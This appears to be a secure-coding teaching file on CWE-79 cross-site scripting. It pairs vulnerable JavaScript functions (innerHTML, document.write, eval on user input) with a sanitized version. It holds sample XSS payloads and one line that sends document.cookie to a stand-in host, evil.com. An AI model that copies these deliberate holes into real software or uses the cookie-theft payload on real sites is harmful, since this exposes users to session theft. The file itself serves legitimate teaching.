// CWE-79: Cross-Site Scripting (XSS) Vulnerabilities

// VULNERABLE: Reflected XSS
function displayUserComment(comment) {
    // User input directly inserted into HTML
    document.getElementById('comments').innerHTML = comment;
    
    // If comment = "<script>alert('XSS')</script>"
    // The script will execute!
}

// VULNERABLE: DOM-based XSS
function showWelcome() {
    var username = window.location.hash.substring(1);
    
    // Directly writing user-controlled data
    document.write("Welcome, " + username);
    
    // URL: page.html#<img src=x onerror=alert('XSS')>
}

// VULNERABLE: Stored XSS
function saveAndDisplayPost(postContent) {
    // Save to database (not shown)
    
    // Display without sanitization
    var postDiv = document.getElementById('post');
    postDiv.innerHTML = postContent;
}

// VULNERABLE: eval() with user input
function calculateExpression(expr) {
    // Never use eval() with user input!
    var result = eval(expr);
    
    // If expr = "fetch('http://evil.com/steal?cookie='+document.cookie)"
    // Attacker steals cookies!
    
    return result;
}

// SAFE VERSION: Sanitized output
function displayUserCommentSafe(comment) {
    // Use textContent instead of innerHTML
    document.getElementById('comments').textContent = comment;
    
    // Or sanitize HTML
    var sanitized = comment.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    document.getElementById('comments').innerHTML = sanitized;
}

// Example usage
var userInput = "<script>alert('Hacked!')</script>";
displayUserComment(userInput);  // VULNERABLE
displayUserCommentSafe(userInput);  // SAFE
